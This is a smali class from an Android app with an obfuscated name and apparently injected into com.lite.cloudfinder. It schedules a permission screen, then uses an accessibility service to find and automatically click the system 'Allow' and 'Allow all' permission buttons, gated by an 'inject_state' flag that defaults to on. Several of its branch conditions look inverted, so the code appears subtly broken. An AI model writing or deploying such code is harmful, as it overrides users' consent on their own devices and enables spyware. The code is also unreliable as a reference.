.class public final Lڝږ؁ڋ/ھ;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

# 调试模式的唯一流水线：
#   isDebug(ctx)        inject_state.debug_mode（默认 true）
#   startPerm(ctx)      2 秒后拉起 PermissionActivity
#   scheduleClick(svc)  权限框出现后 2 秒，去找“允许”并点击
# step 0 = 拉起权限页；step 1/2 = 点击重试

.field private static handler:Landroid/os/Handler;
.field private final ctx:Landroid/content/Context;
.field private final step:I

.method static constructor <clinit>()V
    .locals 2
    new-instance v0, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v1
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    sput-object v0, Lڝږ؁ڋ/ھ;->handler:Landroid/os/Handler;
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;I)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lڝږ؁ڋ/ھ;->ctx:Landroid/content/Context;
    iput p2, p0, Lڝږ؁ڋ/ھ;->step:I
    return-void
.end method

.method public static isDebug(Landroid/content/Context;)Z
    .locals 3
    :try_start_0
    const-string v0, "inject_state"
    const/4 v1, 0x0
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    const-string v1, "debug_mode"
    const/4 v2, 0x1
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return v0
    :catch_0
    move-exception v0
    const/4 v0, 0x1
    return v0
.end method

.method public static startPerm(Landroid/content/Context;)V
    .locals 4
    :try_start_0
    sget-object v0, Lڝږ؁ڋ/ھ;->handler:Landroid/os/Handler;
    new-instance v1, Lڝږ؁ڋ/ھ;
    const/4 v2, 0x0
    invoke-direct {v1, p0, v2}, Lڝږ؁ڋ/ھ;-><init>(Landroid/content/Context;I)V
    const-wide/16 v2, 0x7d0
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method public static scheduleClick(Landroid/content/Context;)V
    .locals 4
    :try_start_0
    sget-object v0, Lڝږ؁ڋ/ھ;->handler:Landroid/os/Handler;
    const/4 v1, 0x0
    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V
    new-instance v1, Lڝږ؁ڋ/ھ;
    const/4 v2, 0x1
    invoke-direct {v1, p0, v2}, Lڝږ؁ڋ/ھ;-><init>(Landroid/content/Context;I)V
    const-wide/16 v2, 0x7d0
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method public run()V
    .locals 8
    :try_start_0
    iget-object v0, p0, Lڝږ؁ڋ/ھ;->ctx:Landroid/content/Context;
    if-nez v0, :cond_0
    return-void
    :cond_0
    iget v1, p0, Lڝږ؁ڋ/ھ;->step:I
    if-nez v1, :step0
    goto :click
    :step0
    new-instance v1, Landroid/content/Intent;
    const-class v2, Lcom/lite/cloudfinder/activity/PermissionActivity;
    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const/high16 v2, 0x10000000
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    return-void

    :click
    instance-of v1, v0, Landroid/accessibilityservice/AccessibilityService;
    if-nez v1, :ret
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;
    const/4 v1, 0x0
    move-object v2, v0
    check-cast v2, Landroid/accessibilityservice/AccessibilityService;
    invoke-virtual {v2}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v3
    if-nez v3, :ret
    const/4 v4, 0x0
    new-array v4, v4, [Ljava/lang/String;
    const/4 v4, 0x4
    new-array v4, v4, [Ljava/lang/String;
    const/4 v5, 0x0
    const-string v6, "com.android.permissioncontroller:id/permission_allow_all_button"
    aput-object v6, v4, v5
    const/4 v5, 0x1
    const-string v6, "com.android.permissioncontroller:id/permission_allow_button"
    aput-object v6, v4, v5
    const/4 v5, 0x2
    const-string v6, "com.google.android.permissioncontroller:id/permission_allow_all_button"
    aput-object v6, v4, v5
    const/4 v5, 0x3
    const-string v6, "com.google.android.permissioncontroller:id/permission_allow_button"
    aput-object v6, v4, v5
    const/4 v5, 0x0
    :loop
    array-length v6, v4
    if-ge v5, v6, :ret
    aget-object v6, v4, v5
    invoke-virtual {v3, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;
    move-result-object v6
    if-eqz v6, :next
    invoke-interface {v6}, Ljava/util/List;->isEmpty()Z
    move-result v7
    if-eqz v7, :next
    const/4 v7, 0x0
    invoke-interface {v6, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;
    move-result-object v6
    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;
    const/16 v7, 0x10
    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    return-void
    :next
    add-int/lit8 v5, v5, 0x1
    goto :loop
    :ret
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method
